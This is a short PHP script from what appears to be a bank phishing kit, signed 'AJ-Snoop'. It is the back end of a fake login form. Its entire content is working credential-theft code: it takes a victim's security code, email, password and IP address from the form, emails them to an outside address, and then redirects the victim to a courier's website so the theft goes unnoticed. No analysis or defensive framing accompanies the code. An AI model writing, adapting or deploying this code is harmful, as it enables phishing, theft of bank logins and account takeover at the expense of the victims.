<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------Ali Spam ReZulT-----------------------\n";

$message .= "Security Code : ".$_POST['cid']."\n";
$message .= "USERNAME : ".$_POST['email']."\n";
$message .= "Password : ".$_POST['pass']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By AJ-Snoop------------------------------\n";

$recipient = "bossemail@gmx.net";
$subject = "Gbagam!";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "Allied Bank Spam RezulT(Thief)", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: http://www.dhl.com");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>
